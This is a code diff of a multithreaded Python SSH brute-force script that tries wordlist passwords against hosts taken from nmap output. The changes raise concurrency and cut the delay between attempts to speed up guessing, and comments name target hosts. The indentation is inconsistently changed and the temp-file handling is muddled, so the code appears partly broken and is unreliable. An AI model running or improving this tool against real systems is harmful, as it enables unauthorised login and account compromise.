@@ -13,8 +13,8 @@ class sharedThings():
     def __init__(self, host):
         self.threadCound = 0
         self.found = False
-		self.password = ""
-		self.host = host
+        self.password = ""
+        self.host = host
     def incthreadCount(self):
         self.threadCound += 1
     def decthreadCount(self):
@@ -23,7 +23,7 @@ class sharedThings():
         return self.threadCound
     def setFound(self, password):
         self.found = True
-		self.password = password
+	self.password = password
     def isFound(self):
         return self.found
 	def getPassword(self):
@@ -34,15 +34,14 @@ class sharedThings():
 class BruteForceTask(Thread):
     def __init__(self, host, password, sharedO):
         Thread.__init__(self)
-
-		self.host = host
-		self.password = password
-		self.sharedO = sharedO
+	self.host = host
+	self.password = password
+	self.sharedO = sharedO
 
 
     def run(self):
         try:
-			tempPassFileScript = self.password + ".pass"
+	    tempPassFileScript = self.password
             f = open(self.password, "w+")
             f.write("echo " + tempPassFileScript)
             f.close()
@@ -52,16 +51,16 @@ class BruteForceTask(Thread):
             subprocess.check_output(["./ssh_session.sh", tempPassFileScript, self.host])
             passwordFoundCallback(self.password, self.sharedO)
         except:
-			pass
-			#different errors should be handled differently
-			#example of potential error:
-			#							- Permission denied (nothing to do here, this is normal. Bad username/password Combination)
-			#							- Connection closed (too many requests. We should try the password again and reduce the debit)
-			#							- Connection refused (the port isnt open)
-			#							- Other errors (the host isnt found and stuff)
-		finally:
-			subprocess.check_output(["rm", tempPassFileScript])
-			self.sharedO.decthreadCount()
+		pass
+		#different errors should be handled differently
+		#example of potential error:
+		#							- Permission denied (nothing to do here, this is normal. Bad username/password Combination)
+		#							- Connection closed (too many requests. We should try the password again and reduce the debit)
+		#							- Connection refused (the port isnt open)
+		#							- Other errors (the host isnt found and stuff)
+	finally:
+		subprocess.check_output(["rm", tempPassFileScript])
+		self.sharedO.decthreadCount()
 
 class SocketListener(Thread):
 
@@ -118,7 +117,7 @@ for entry in listedNmapString:
 	except:
 		errorOccured = True
 
-	threadLimit = 8 #this is experimentally the highest ive reached without getting connection closed error
+	threadLimit = 30 #this is experimentally the highest ive reached without getting connection closed error
 	sharedO = sharedThings(host) #used to mimic static variable. Used by processes to notice that they found a password
 							     #need an instance of sharedThings per attacked Host
 	#TODO: ssh root login is disabled on PIONE; Couldnt test PITWO since i cant find it
@@ -136,7 +135,9 @@ for entry in listedNmapString:
 		for line in f:
 			t = BruteForceTask(host, line, sharedO)
 			t.start()
-			time.sleep(0.3)  # this is experimentally the fastest ive reached without getting connection closed error; may be different value for different hosts
+			time.sleep(0.03)  # this is experimentally the fastest ive reached without getting connection closed error; may be different value for different hosts
+			#can be a lot faster when executing locally (local: 0.03 vs web: 0.3)
+
 			sharedO.incthreadCount()
 			while threadLimit < sharedO.getthreadCount():
 				time.sleep(1)
